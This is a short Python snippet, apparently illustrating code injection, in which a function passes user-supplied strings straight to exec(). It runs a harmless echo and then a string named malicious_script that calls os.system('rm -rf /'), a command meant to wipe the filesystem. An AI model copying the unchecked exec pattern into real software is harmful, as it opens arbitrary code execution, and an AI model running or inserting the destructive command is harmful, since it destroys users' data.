def execute_user_script(script):
    exec(script)

user_script = "import os; os.system('echo Vulnerable!')"
execute_user_script(user_script)

malicious_script = "__import__('os').system('rm -rf /')"
execute_user_script(malicious_script)